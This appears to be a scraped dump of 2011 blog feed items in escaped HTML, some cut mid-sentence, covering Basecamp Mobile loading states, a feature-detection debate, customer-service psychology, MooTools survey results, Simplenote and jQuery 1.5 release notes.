load</h3>\n\n\n\t<p>Basecamp Mobile is loading assets the first time you run it or when the local cache is empty. The large animation is the only element on the screen making it the focus. The lack of any other UI elements makes it clear that the only option here is to wait. Because people see this before they see the app, it’s even more important that we let them know what is happening.</p>\n\n\n\t<p><img src=\"http://s3.amazonaws.com/37assets/svn/557-post_app_loading.png\" alt=\"App loading state\"></p>\n\n\n\t<p>If this initial load is taking too long we let the user know. After a short wait, the app reassures people that it’s still working.</p>\n\n\n\t<p><img src=\"http://s3.amazonaws.com/37assets/svn/558-post_app_slow.png\" alt=\"Slow loading state\"></p>\n\n\n\t<p>If the screen still doesn’t load after a few more seconds the app offers some other options: Refresh the browser and try again or try the standard version. The latter option is useful for users who may be attempting to load the mobile optimized version on an unsupported device and need the option to switch back to the normal version.</p>\n\n\n\t<p><img src=\"http://s3.amazonaws.com/37assets/svn/559-post_app_veryslow.png\" alt=\"Very slow loading\"></p>\n\n\n\t<h3>Loading content</h3>\n\n\n\t<p>In the next state, the app has loaded and the UI is now available, the app is only loading content now. The user can always cancel the action and go back to the previous screen. You’ll see this the first time you load a screen that you haven’t loaded before like a newly posted message.</p>\n\n\n\t<p><img src=\"http://s3.amazonaws.com/37assets/svn/560-post_content_load.png\" alt=\"Cold cache loading\"></p>\n\n\n\t<h3>Refreshing content</h3>\n\n\n\t<p>Basecamp Mobile caches screens as you visit them so going back and forth between them is nearly instant. Because the data could be old we need to check the server for changes, new items, new comments, etc. The screen might be perfectly fine, or it might need to load in changes. While this is happening we show a small, less prominent indicator. The page is fully functional but we want to let the user know that we’re talking to the server. This indicator isn’t in the user’s face or in the way of what they’re doing. It’s just a notice that the app is working and if you’re expecting something new, we’re checking. You can see the spinning icon in the upper-right of this screenshot:</p>\n\n\n\t<p><img src=\"http://s3.amazonaws.com/37assets/svn/561-post_syncing.png\" alt=\"Syncing indicator\"></p>\n\n\n\t<p>The icon actually duplicates the functionality of the browser’s own loading spinner (visible in the top toolbar in the screenshot above) but we felt like people were likely to ignore or completely miss it. The approach brings the loading indicator a little closer to the action without making it more intrusive.</p>\n\n\n\t<h3>Loading previews</h3>\n\n\n\t<p>We took a similar approach with the To-do Lists screen. For each list we wanted to show the first few items on it. This makes it clear these are to-do lists and helps people identify the one they need. The previews load after the page is available because the content is helpful but not essential. A very subtle effect doesn’t distract but makes it clear something is happening. A series of spinners would have overwhelmed this screen, but the subtle gradient shine moving over the word “loading” informs without distracting.</p>\n\n\n\t<p><img src=\"http://s3.amazonaws.com/37assets/svn/562-post_todo_list.png\" alt=\"List preview loading\"></p>\n\n\n\t<h2>Final thoughts</h2>\n\n\n\t<p>Presented like this it may appear that the app is just a series of waits, it’s not. Most of these indicators are actually on the screen for just seconds, but that is sufficient time to quiet a user’s doubts and ensure they know things are working. It feels great to click through the app and always feel like you know what’s happening, that things are working.</p>\n\n\n\t<p>We use prominence of these indicators to tell people how important it is that they wait. The amount of surrounding UI is a clue about what else they can do if they don’t want to. You certainly have to wait for the app, itself, to load. But you can pass right by a To-do list that’s fetching a preview of it’s items. Just the right UI feedback makes sure users know this without having to think about it.</p><div>\n<a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=TFBn6oKwps8:vOwW6ZYWMuM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=TFBn6oKwps8:vOwW6ZYWMuM:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=7Q72WNTAKBA\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/37signals/beMH/~4/TFBn6oKwps8\" height=\"1\" width=\"1\">"

      "content" : "<p>Unless you’ve not been paying attention during the past week, you may have come across Alex Russell’s recent treatises on the cost of feature detection and one possible solution<sup>[1]</sup>. Alex is one of the smartest folks I’ve ever met, and I’ve always admired his willingness to share his opinion in any forum regardless of the popularity of the thought or the response quality he’d receive. While I can’t say I always agree with his conclusions, I can say that I respect how he arrives at them. And this is why I feel badly when his points of view get misrepresented to the point of confusion.</p>\n<h2>The beginning</h2>\n<p>In his first post on the subject, <cite>Cutting the interrogation short</cite><sup>[1]</sup>, Alex makes several claims:</p>\n<ol>\n<li>Feature detection is not the panacea for cross-browser solutions</li>\n<li>Some feature detection techniques incur a performance hit that isn’t always reasonable</li>\n<li>The set of available features for known browsers is known</li>\n</ol>\n<p>I don’t find anything terribly controversial about these claims, and further, I believe them all to be correct and easily verifiable. The second point is actually the key to understanding his position.</p>\n<p>The fastest running code is the code that performs the fewest number of operations. As a good programmer, and certainly one that wishes to deliver the best user experience, it is your job to complete any given ask using the fewest number of operations. Feature detection necessarily introduces additional operations to determine the appropriate set of next operations.</p>\n<p>While I’ve never been opposed to feature detection such as determining whether a given function or property exists, I’ve openly opposed the type of long and involved feature detection techniques<cite></cite><sup>[2]</sup> employed by some libraries and developers, especially when performed as an upfront evaluation of multiple features, such as those found in Modernizr<cite></cite><sup>[3]</sup>. As someone who’s worked on several large-scale, highly trafficked web sites, I’ve always made it a point to avoid this type of methodology for performance reasons.</p>\n<h2>The proposal</h2>\n<p>Alex’s proposal for improving the performance of feature detection was to determine and then cache the results of feature tests for known browsers. This would allow libraries to skip passed the long and time-consuming feature detection code when the results are actually already known. The approach requires a certain level of user-agent detection<cite></cite><sup>[4]</sup> to serve up the correct feature detection set.</p>\n<p>Now, I’ve been (in)famous for saying in that past that I don’t believe user-agent detection is bad or evil or that it breaks the spirit of the Web or any such thing – I’ve simply stated that it’s a technique you should know in general and understand where and when it’s appropriate to use. I’ll say this again: you use user-agent detection when you want to identify the browser being used. That’s it. Feature detection, on the other hand, is used when you want to determine that a feature is available for use. These are two different techniques with two very different use cases.</p>\n<p>The proposal from Alex is to use user-agent detection to load the results of feature tests run in a particular user-agent while leaving regular feature detection for browsers that are unknown entities. Let’s face it, Internet Explorer 6′s feature set is not changing, so if you can accurately detect this browser it makes sense to preload its feature set.</p>\n<p>I would also augment Alex’s proposal with the same caution that I have with user-agent sniffing, which is to only identify <em>previous versions</em> of browsers (not current ones). You cannot  be certain that a feature set is frozen for a particular browser until the next version is released. Case in point: Internet Explorer 8 shipped with a native JSON implementation that didn’t match the final ECMAScript 5 specification. This was later fixed in a patch<sup>[5]</sup>. At that point in time, Internet Explorer 8 was the most recent release so it would only be reasonable to cache results from Internet Explorer 7 or earlier.</p>\n<h2>What he didn’t say</h2>\n<p>Almost as interesting as what Alex did say is what he didn’t say. Mostly because people immediately started hinting that he actually was saying the things that he didn’t say. This is an incredibly frustrating yet unbelievably common occurrence on the web that I’ve also dealt with. Not that Alex needs anyone coming to his rescue, but I do want to outline the things he never said in his posts:</p>\n<ol>\n<li>He never said that user-agent detection is better than feature detection</li>\n<li>He never said that feature detection is bad and shouldn’t be used</li>\n<li>He never said that user-agent detection is awesome and should always be used</li>\n<li>He never said his proposal is the only solution</li>\n</ol>\n<p>As tends to happen with controversial topics, people have been latching on to one or two sentences in the entire post rather than trying to absorb the larger point.</p>\n<h2>My opinion</h2>\n<p>I was asked by a colleague last week what I thought about Alex’s proposal. Since I had only skimmed the two posts, I decided to go back and actually read them carefully. First and foremost, I think Alex accurately outlines the problems with the current feature detection craze, which can be summarized neatly as “all feature detection, all the time” or even more succinctly, “feature detection, always.” He’s correct in pointing out that the feature detection craze doesn’t pay close enough attention to the performance overhead associated with running a bunch of feature tests upfront.</p>\n<p>Generally, I like the idea of having pre-built caches of feature tests for older, known browsers such as Internet Explorer 6 and 7. We absolutely know the issues with these browsers and neither the issues nor the browsers are going away anytime soon. I’m less convinced of the need to cache information for other classes of browsers, especially those that update with regular frequency. For instance, I think it would be wasteful to do such caching for Chrome, which auto-updates at such a dizzying pace that I can’t tell you off the top of my head which version I’m running on this computer.</p>\n<p>At this point, I’m more in favor of Alex’s proposal than I am against it. I do believe there’s value in caching feature detection results for known entities, however, I believe the number of UAs for which that should be done is small. I would target two sets of browsers: older ones (IE6/IE7) and specific mobile ones. Interestingly, these share the common aspect of running code slower than modern browsers running on desktops. Keeping a small static cache designed to optimize for the worst-performing browsers makes the most sense to me, and then I would only do additional feature tests on an as-needed basis – running the test on the first attempt to use the feature and then caching it dynamically.</p>\n<p>I’m sure there’s a sweet spot of cached feature data that can be found by focusing primarily on the outliers, especially ones that are using slower JavaScript engines (IE6) or low-powered devices (mobile) that cause slower-running JavaScript. Of course, as with every theory, this approach would have to be tested out in real world scenarios to figure out the exact savings. Personally, I think it’s worth investigating.</p>\n<h2>References</h2>\n<ol>\n<li><a href=\"http://infrequently.org/2011/01/cutting-the-interrogation-short/\">Cutting the interrogation short</a>, by Alex Russell</li>\n<li><a href=\"http://kangax.github.com/cft/\">JavaScript feature testing</a></li>\n<li><a href=\"http://modernizr.com\">Modernizr</a></li>\n<li><a href=\"http://infrequently.org/2011/02/on-performance-innumeracy-false-positives/\">Performance innumeracy &amp; false positives</a>, by Alex Russell</li>\n<li><a href=\"http://support.microsoft.com/kb/976662\">An update is available for the native JSON features in Internet Explorer 8</a></li>\n</ol>\n<h2>Related posts</h2>\n<ul>\n<li><a href=\"http://www.nczonline.net/blog/2011/02/14/separating-javascript-download-and-execution/\" title=\"Separating JavaScript download and execution\">Separating JavaScript download and execution</a></li>\n<li><a href=\"http://www.nczonline.net/blog/2009/12/29/feature-detection-is-not-browser-detection/\" title=\"Feature detection is not browser detection\">Feature detection is not browser detection</a></li>\n<li><a href=\"http://www.nczonline.net/blog/2007/01/15/feature-detection-browser-detection/\" title=\"Feature detection != browser detection\">Feature detection != browser detection</a></li>\n<li><a href=\"http://www.nczonline.net/blog/2006/11/16/browser-detection-versus-feature-detection/\" title=\"Browser detection versus feature detection\">Browser detection versus feature detection</a></li>\n<li><a href=\"http://www.nczonline.net/blog/2010/07/27/determining-if-an-object-property-exists/\" title=\"Determining if an object property exists\">Determining if an object property exists</a></li>\n<li><a href=\"http://www.nczonline.net/blog/2010/02/09/announcing-high-performance-javascript/\" title=\"Announcing High Performance JavaScript\">Announcing High Performance JavaScript</a></li>\n</ul>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/nczonline?a=JkK3L1E1OFU:f2VoVB3FO_4:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/nczonline?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/nczonline?a=JkK3L1E1OFU:f2VoVB3FO_4:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/nczonline?i=JkK3L1E1OFU:f2VoVB3FO_4:V_sGLiPBpWU\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/nczonline?a=JkK3L1E1OFU:f2VoVB3FO_4:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/nczonline?d=qj6IDK7rITs\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/nczonline?a=JkK3L1E1OFU:f2VoVB3FO_4:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/nczonline?i=JkK3L1E1OFU:f2VoVB3FO_4:F7zBnMyn0Lo\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/nczonline/~4/JkK3L1E1OFU\" height=\"1\" width=\"1\">"

Be good — and your customers will be good right back to you.” <a href=\"http://www.inc.com/author/jason-fried\">Jason’s other columns at Inc.</a></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=W1cQQfFqUM0:s0BAKRKYTps:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=W1cQQfFqUM0:s0BAKRKYTps:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=7Q72WNTAKBA\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/37signals/beMH/~4/W1cQQfFqUM0\" height=\"1\" width=\"1\">"

Companies that offer outstanding customer service typically do so by training their employees to absorb and dismantle customer negativity and hostility by employing a sequence of steps that include empathy statements, taking responsibility, timely management of problems, follow-up and others. However, those companies offering consistently excellent customer service are still vastly outnumbered by those whose customer service efforts too often fall short.</p><p>To truly revolutionize customer service, change needs to occur on both sides of the customer service aisle. On the corporate side, far more companies need to provide consistently excellent customer service and invest in training their employees accordingly. On the consumer side, the psychological mindset customers bring to customer service interactions has to change from one laden with negative expectations, anticipatory dread and hostility, to one that is less emotionally charged and more open minded.</p><p><span></span></p><p>Get Satisfaction has been at the vanguard of such efforts by creating a culture of communication and dialogue between corporations and consumers that goes beyond mere complaint handling and other typical customer service interactions to include platforms for positive feedback, open suggestions and most importantly, interactions between the customers themselves.</p><p>To understand why such efforts are so crucial for impacting consumer psychology at large, it is important to understand the psychological beliefs and fears customers typically bring to their encounter with customer service professionals, especially when it comes to voicing complaints.</p><p>The negative mindset and expectations customers traditionally bring to service interactions usually exist independently of any prior experience with the product or company in question. Rather, they represent the fallout of a societal shift in the very nature of how complaints and their functions are now perceived in all aspects of our lives. Today, we regard complaints primarily as opportunities to vent frustrations, not as opportunities to resolve problems. This is as true in our personal lives as it is in our lives as consumers. We rarely voice our dissatisfactions directly to the person who can do something about them, whether that person is a company, a spouse, a friend or a colleague. Instead we voice our complaints to anyone<em>bu</em>t the person who can rectify the situation.</p><p>Why is this so?</p><p>Customers are fundamentally hesitant to address their complaints directly to the company in question because they struggle with 3 deep seated fears:</p><ol><li>They believe the process of complaining will require too much time and effort and involve too much aggravation.</li><li>They fear companies don’t really care about customers and therefore, that they are unlikely to get a satisfying resolution to their problem and that their time, effort and aggravation will be for naught.</li><li> They fear the service representative will become defensive and retaliate by disconnecting them, placing them on hold for extended periods or by sabotaging their efforts in other ways.</li></ol><p>As a result, complaining customers initiate their calls and appeals to service representatives only once they are in full ‘battle mode.’a This extremely negative mindset often translates into their approaching the service representative with anger, defensiveness, suspicion, and hostility, which often elicits the very responses they feared in the first place.</p><p>Creating a culture of communication, cooperation and community between companies and their customers, is a crucial step in dismantling the negative customer mindset, especially as it relates to complaint handling. Efforts to expand the dialogue between companies and their customers as well as enabling such discussions among customers themselves can over time, impact the deeply rooted negative attitudes and beliefs that determine much of consumer psychology and behavior today.</p><p>However, such efforts would benefit greatly by addressing consumer psychology at the source as our current complaining psychology is an essential piece of the puzzle. Fortunately, the shift in our perception of complaints over the past decades and its negative impact on our lives is finally gaining initial awareness in the general public. This development could not be timelier because changing how people feel and behave about the businesses and corporations with which they interact, and revolutionizing the nature of customer service is ultimately a dance for two.</p><p><img style=\"margin:10px;border:1px solid black\" title=\"guy-winch-author\" src=\"http://blog.getsatisfaction.com/wp-content/uploads/guy-winch-author.jpg\" alt=\"\" width=\"137\" height=\"172\"></p><p><em>Guy Winch, Ph.D., received a doctorate in clinical psychology from New York University, completed a postdoctoral fellowship in family and couple therapy, and has been using complaints as a therapeutic tool in his psychotherapy practice for more than a decade.

      "content" : "<p>Last month we held the <a href=\"http://mootools.net/blog/2010/12/05/mootools-survey\">MooTools User’s Survey</a> and we would like to thank you all for participating and sharing your ideas. We received more than 700 submissions!  Here is a summary of the results and our thoughts about them.</p>\n\n<h3>Core</h3>\n\n<p>Most of you think MooTools Core is fine as it is, with an obvious exception: Swiff has to go. This change has already been planned for the next major release. There are several good ideas about what we could add to Core: element shortcuts (<code>.hide()</code> and <code>.show()</code>, for example), a few Types from MooTools More, Event Delegation, Pseudo Events, and <a href=\"http://wwwdelivery.superstock.com/WI/223/1558/PreviewComp/SuperStock_1558-09213.jpg\">cowbells</a>! In short, we would like to keep MooTools Core a compact, modular, object oriented framework. Specific UI plugins, for instance, would be a better fit for MooTools More or maybe the Forge.</p>\n\n<h3>More</h3>\n\n<p>Many of you supplement MooTools Core with MooTools More (96%) but are also equally divided whether More should contain UI plugins or if those should be in the Forge. Most of you (60%) like to see more abstraction APIs, such as enhancements to Core. That’s probably why Types and Drag are the most popular More components. HtmlTable is the biggest candidate for removal (43%) followed by Accordion (34%) (ndVP: yey!). In general, you had many ideas about what to add to MooTools More, such as specific UI plugins, support for HTML5 features, geolocation, and storage.</p>\n\n<h3>Forge</h3>\n\n<p>The Forge is pretty popular, about 65% of respondents use the Forge to a find plugin. About 11% have contributed to the Forge with new plugins. Respondents shared great ideas for improving the Forge, including: comments, ratings, better search, featured plugins or a combined (packager-web) download page which selects all dependencies.</p>\n\n<h3>API Documentation</h3>\n\n<p>A very important part of MooTools is the online API documentation. Most of you think they are pretty good, but are also put off by the lacks of examples. We’ve heard you and that’s why we responded with our <a href=\"http://mootools.net/demos\">fancy new demos</a> which we <a href=\"http://mootools.net/blog/2011/01/04/new-demos\">released</a> a few weeks ago! Our plan is to add new demos which we will use as additions to the docs. You will find links from the docs to the demos, which you can play with thanks to the <a href=\"http://jsfiddle.net\">jsfiddle</a> integration. We don’t have demos of each part of Core or More yet, so if you want to help, you can fork the <a href=\"http://github.com/mootools/mootools-demos\">repository</a> and add new ones, or just ping us (<a href=\"http://www.twitter.com/astolwijk\">@astolwijk</a> or <a href=\"http://www.twitter.com/fakedarren\">@fakedarren</a>) with new jsfiddles. Another popular idea that we particularly liked is the addition of a comment system to the API documentation.</p>\n\n<p>I’d like to point out that you can easily start hacking on the docs if you feel so inclined. Just make sure you have a github account, fork <a href=\"http://www.github.com/mootools/mootools-core\">mootools-core</a> or <a href=\"http://www.github.com/mootools/mootools-more\">mootools-more</a>, browse to the Docs folder and select a .md file. Github has awesome online editing features, so you can work without knowing anything about GIT! If you modify a file we will see it via the network view and will include your fix into the main repository.</p>\n\n<h3>Upgrade to MooTools 1.3</h3>\n\n<p>We are really happy to see that the release of MooTools 1.3 went smoothly and most of you are already in love with the new MooTools. One point for improvement would be to put the <a href=\"https://github.com/mootools/mootools-core/wiki/Upgrade-from-1.2-to-1.3\">upgrade</a> tutorials on the wiki in a more prominent place on the mootools.net website.</p>\n\n<h3>The lucky winner of the T-Shirt</h3>\n\n<p>Congratulations to the lucky winner of the awesome MooTools t-shirt. You’ll receive it shortly, and we sincerely hope you’ll wear it with pride!</p>\n\n<p>In conclusion, thanks for all the <em>“MooTools FTW!”</em> responses, the cowbells suggestions, and other great feedback you guys sent us. We &lt;3 you.</p>\n<img src=\"http://feeds.feedburner.com/~r/mootools-blog/~4/jFmy2h25RTQ\" height=\"1\" width=\"1\">"

Find below, some of their observations, thoughts and proposals.</p>\n<h2>Introduction</h2>\n<p><strong>Did you ever try to learn about some new technology on the web?</strong><br>\nWe often got stuck with bits and pieces, video tutorials in poor quality and scattered unrelated content. </p>\n<p>The Mozilla Open Web Library wants to change this experience for the better. We aim to motivate &amp; enable people to learn about open web technologies by providing  easy access to informative online content. </p>\n<h2>What should the experience be?</h2>\n<p>For a successful learning experience, we propose that complete topic content comes bundled in modules that build on each other. This enables a course like structure decoupled into chapters that range from the basics the advanced techniques.</p>\n<p>This allows the student to consume the entire topic from start to finish or just brush up on those modules that are of interest to yourself. </p>\n<h2>Delivery of content</h2>\n<p>Different methods of content delivery were identified, investigated and debated.  Finally we settled on videos being the medium of choice.</p>\n<p>We believe that videos are the most versatile tool that enables a real-talk-like experience as well as hand-on-examples. Text and exercises are  possible as well and can complement video content. They can  also make a good basis for courses within the proposed <a href=\"http://mozillalabs.com/conceptseries/2010/11/30/crowdsourcing-project-brainstorming-research-and-proposals-for-student-outreach-channel/\">Student Outreach channel</a>.</p>\n<p>In order to give a sense of achievement and to keep the learner motivated we think that short modules (videos) are the best way. People are more likely to consume bite size chunks in the form of a series while still having the ability to go through the entire topic.</p>\n<h2>Quality of content</h2>\n<p>It is quite hard to decide, for the moment, how restrictive we are about the quality of content that will be provided and how crowd involvement can support the library. </p>\n<p>In order to provide the best content upfront we thought about initially involving  professionals in the creation of the open web library.<br>\nThey would provide an overview over core topics in different fields. </p>\n<h2>Structural overview of the library</h2>\n<p>We propose:</p>\n<ul>\n<li>Offering free and high quality content that enables people to enhance their web and its related technologies</li>\n<li>Delivering content in a way that will allow people to learn and participate with  an underlying structure as a guide for their learning process. This  structure based on relations of subjects could be developed by  collaborative/open recommendations made by experts</li>\n<li>Defining the format of the content as, primarily, short videos; but we are also  open to experience with other interesting type of content</li>\n<li>Getting content created – in the future – by crowd involvement. At first we will ask  experts to share their knowledge and we guarantee that it will be great!</li>\n<li>Encouraging people’s participation by allowing them to rate videos, make comments  or participate through any other feedback mechanism. This will be an  open library, so people’s opinion and material will be our most powerful  fuel to make it awesome</li>\n</ul>\n<h2>Going forward</h2>\n<p>Remember, this channel is still an idea in incubation within the framework of the proposed <a href=\"http://mozillalabs.com/conceptseries/2010/10/18/concept-series-a-time-to-evolve-into-something-new/\">evolution of the Mozilla Labs Concept Series</a>.</p>\n<p><em><strong>We’d love to hear your thoughts</strong> – Email cyberdees[at]mozilla[dot]com</em><br>\n<em><strong>For all the latest updates</strong> – Watch this space or follow <a href=\"http://twitter.com/MozConcept\">@MozConcept on Twitter</a></em></p>"

Your computers sync information with your devices, your apps sync information with other apps, and everybody wins.</p>\n\n<p>We're all about syncing here at Simperium. It's our pleasure to announce seamless integration with <a href=\"http://dropbox.com\">Dropbox</a>, another great syncing service (and, incidentally, a fellow <a href=\"http://ycombinator.com\">Y Combinator</a> startup company).</p>\n\n<p>Dropbox is a great way to sync files. When you link your Dropbox account to your Simplenote account, all your notes in Simplenote will appear as text files in the Dropbox directory of your choice. Thereafter, your notes and files stay synchronized as you make changes. Syncing happens in both directions.</p>\n\n<p>Best of all, you just need to set this up once, and it works automatically everywhere you use Simplenote: iOS, the web app, and all 3rd-party apps.</p>\n\n<p>Syncing with Dropbox currently happens every several minutes. We'll improve this approach as new syncing features become available in both Dropbox and Simplenote.</p>\n\n<p>To configure Dropbox syncing, premium users can <a href=\"https://simple-note.appspot.com\">access their account settings</a> in the web app.</p>\n\n<h3>Lists</h3>\n<p>Lots of people use Simplenote to keep lists. Using an iPhone or iPad, premium subscribers can now turn any note into a reorderable list of items. Go to the Note Info screen and toggle the View as List switch. You can easily edit items, rearrange them, and cross them off by swiping them.</p>\n\n<p>Lists are stored as plaintext, so they also work with the Simplenote web app and all 3rd-party apps.</p>\n\n<h3>Price</h3>\n<p>We hope you agree that Simplenote is a valuable service. Starting today, the price of premium subscriptions will be $1.99 per month, or $19.99 per year.</p>\n\n<p>Your support helps us to keep making improvements to Simplenote. <a href=\"http://simplenoteapp.com/premium\">Here's a table</a> that summarizes the differences between premium and free accounts. If you're ready to upgrade, <a href=\"https://simple-note.appspot.com/settings\">sign in to the web app and access your account settings</a>.</p>"

Throughout, he worked hard at cultivating a relationship with Creative Director Tyler Thompson. Conversations between them often went something like this:</p>\n<p><em><strong>Stephen</strong>: So, when are you going to hire me? I&#39;m dying to come and work with you guys.</em></p>\n<p><em></em><em><strong>Tyler</strong>: Dude, you&#39;re not ready. Go read about color theory.</em></p>\n<p>Back and forth they went, each time Tyler pushing Stephen a bit further along on his creative journey. All along the way, Parker refused to give up.</p>\n<p>As Tyler tells it:</p>\n<p style=\"padding-left:30px\">Stephen asked for a design job at Squarespace 3 times and each time I said no, but gave him my specific reasons. First I asked him to work on color and spacing. I suggested some reading and designs and designers to study and follow. Later his designs lacked the final polish. He continued to study and always pushed himself to be a better designer. I started seeing his work on Dribbble and the Squarespace forum, and they were really, really good. He knew our brand inside and out, knew the system as well as anyone (from working support), and had really blossomed into a damn good designer.</p>\n<p>Needless to say, Stephen's \"stubbornness\" finally paid off when he moved to New York and officially joined the Squarespace design team full-time in December of 2010.</p>\n<p><strong>Name</strong>: Stephen Parker</p>\n<p><strong>Position</strong>: Senior Designer</p>\n<p><strong>What do you actually do every day?</strong> Mostly I&#39;m in Photoshop designing something new, building pages on Squarespace, or making tweaks to something that already exists. I&#39;m responsible for the majority of creative assets that go out for the current version of our system. So, that includes maintenance and expansion of our front site, advertisements, direction for promo videos, art for blog posts, press kits, email newsletters, landing pages, etc.</p>\n<p><strong>What is your background?</strong> I&#39;m an artist. I grew up cooking professionally in restaurants, and I&#39;ve always enjoyed creating things with my hands. For me, art is mostly crafting in a series of rotating mediums; paint, food, music, design, etc.</p>\n<p><strong>Favorite thing about working at Squarespace?</strong> Definitely the cast. Squarespace is filled with an unbelievable collection of brilliant people.</p>\n<p><strong>Who do you admire and why?</strong> <a href=\"http://www.thememagazine.com/stories/muji-kenya-hara/\">Kenya Hara</a> is the Art Director for Muji.

Please take this opportunity to thank members of the <a href=\"http://jquery.org/team\">jQuery Team</a> and the <a href=\"http://blog.jquery.com/2010/11/23/team-spotlight-the-jquery-bug-triage-team/\">jQuery bug triage team</a> for their help in getting this release out the door.</p>\n<h3>Downloading</h3>\n<p>As usual, we provide two copies of jQuery, one minified and one uncompressed (for debugging or reading).</p>\n<ul>\n<li><a href=\"http://code.jquery.com/jquery-1.5.min.js\">jQuery Minified</a> (29kb <a href=\"http://www.julienlecomte.net/blog/2007/08/13/\">Gzipped</a>)</li>\n<li><a href=\"http://code.jquery.com/jquery-1.5.js\">jQuery Regular</a> (207kb)</li>\n</ul>\n<p>You can feel free to include the above URLs directly into your site  and you will get the full performance benefits of a quickly-loading  jQuery.</p>\n<p>Additionally you can also load the URLs directly from Microsoft and Google’s CDNs:</p>\n<p>Microsoft CDN: <a href=\"http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.5.min.js\">http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.5.min.js</a></p>\n<p>Google CDN: <a href=\"https://ajax.googleapis.com/ajax/libs/jquery/1.5.0/jquery.min.js\">https://ajax.googleapis.com/ajax/libs/jquery/1.5.0/jquery.min.js</a></p>\n<h3>About The Release</h3>\n<p>This release saw <a href=\"http://bugs.jquery.com/query?status=closed&amp;resolution=fixed&amp;milestone=1.5&amp;group=resolution&amp;order=priority\">83 fixed bugs</a> and a total of <a href=\"http://bugs.jquery.com/milestone/1.5\">460 closed tickets</a>.</p>\n<p>The test suite (which now has 4437 tests) passes in all the browsers that jQuery supports – and more. We verified the suite passing all of the following browsers:</p>\n<ul>\n<li>Safari 5.0.3 / 4.0.5 / 3.2.3 / 3.1.2</li>\n<li>Opera 11.01 / 11 / 10.63 / 10.54 / 10.10 / 9.64</li>\n<li>IE 6 / 7 / 8</li>\n<li>Firefox 4.0b9 / 3.6.13 / 3.5.11 / 3.0.19 / 2.0.0.20</li>\n<li>Chrome 8.0.552.215 / 8.0.552.237 / 9.0.597.67 Beta / 10.0.642.2 Dev</li>\n</ul>\n<p>Additionally all of the API documentation for the release can be found on the API site: <a href=\"http://api.jquery.com/category/version/1.5/\">jQuery 1.5 API Documentation</a>.</p>\n<p>A full schedule of our upcoming releases can be found on our <a href=\"http://docs.jquery.com/Roadmap\">roadmap</a>. Right now we’re planning on doing major jQuery releases more frequently (likely a couple times a year, rather than once per year).</p>\n<p>So, without further ado, what’s changed in jQuery 1.5?</p>\n<h2>Ajax Rewrite</h2>\n<p>Easily the largest change in this release is the complete rewrite of the Ajax module in jQuery. This rewrite helps to fix a lot of gaps that existed in the old Ajax system along with providing a higher level of consistency across the API.</p>\n<p>Perhaps the largest change is that a call to <a href=\"http://api.jquery.com/jQuery.ajax/\">jQuery.ajax</a> (or jQuery.get, jQuery.post, etc.) now returns a jqXHR object that provides consistency to the XMLHttpRequest object across platforms (and allows you to perform previously-impossible tasks like aborting JSONP requests).</p>\n<p>More details concerning the new jqXHR object can be found in the <a href=\"http://api.jquery.com/jQuery.ajax/\">jQuery.ajax() documentation</a>.</p>\n<p>In addition to a more consistent API the Ajax system is now much more extensible – allowing you to attach all sort of data handlers, filters, and transports. These changes should open up a whole realm of new Ajax plugins that can take advantage of this extensibility. More information can be found in the <a href=\"http://api.jquery.com/extending-ajax/\">Extending Ajax</a> documentation. The team is actively soliciting feedback on the Ajax extensibility API and if you have any feedback please feel free to direct it to the <a href=\"http://forum.jquery.com/developing-jquery-core\">Developing jQuery Forum</a>.</p>\n<h2>Deferred Objects</h2>\n<p>Along with the rewrite of the Ajax module a new feature was introduced which was also made publicly available: <a href=\"http://api.jquery.com/category/deferred-object/\">Deferred Objects</a>. This API allows you to work with return values that may not be immediately present (such as the return result from an asynchronous Ajax request). Additionally it gives you the ability to attach multiple event handlers (something that wasn’t previously possible in the Ajax API).</p>\n<p>For example, the following is now possible with jQuery’s internal Ajax API:</p>\n<pre>// Assign handlers immediately after making the request,\n// and remember the jqxhr object for this request\nvar jqxhr = $.ajax({ url: \"example.php\" })\n    .success(function() { alert(\"success\"); })\n    .error(function() { alert(\"error\"); })\n    .complete(function() { alert(\"complete\"); });\n\n// perform other work here ...\n\n// Set another completion function for the request above\njqxhr.complete(function(){ alert(\"second complete\"); });</pre>\n<p>Additionally you can make your own deferred objects using the exposed jQuery.Deferred. More information about this API can be found in the <a href=\"http://api.jquery.com/category/deferred-object/\">Deferred Object</a> documentation.</p>\n<p>Eric Hynds has written up a good tutorial on <a href=\"http://www.erichynds.com/jquery/using-deferreds-in-jquery/\">Using Deferreds in jQuery 1.5</a>.</p>\n<h2><a href=\"http://api.jquery.com/jQuery.sub/\">jQuery.sub()</a></h2>\n<p>jQuery now exposes a new way in which you can create and modify a clone of jQuery – all while still taking advantage of the full jQuery API. For example, you could use it to override native jQuery methods without actually affecting the methods that other users would interact with – or even create encapsulated APIs for your plugins that avoid namespace collision.</p>\n<p>Here is a sample of adding a method to a jQuery sub so that it isn’t exposed externally:</p>\n<pre>  (function(){\n    var sub$ = jQuery.sub();\n\n    sub$.fn.myCustomMethod = function(){\n      return 'just for me';\n    };\n\n    sub$(document).ready(function() {\n      sub$('body').myCustomMethod() // 'just for me'\n    });\n  })();\n\n  typeof jQuery('body').myCustomMethod // undefined</pre>\n<p>More 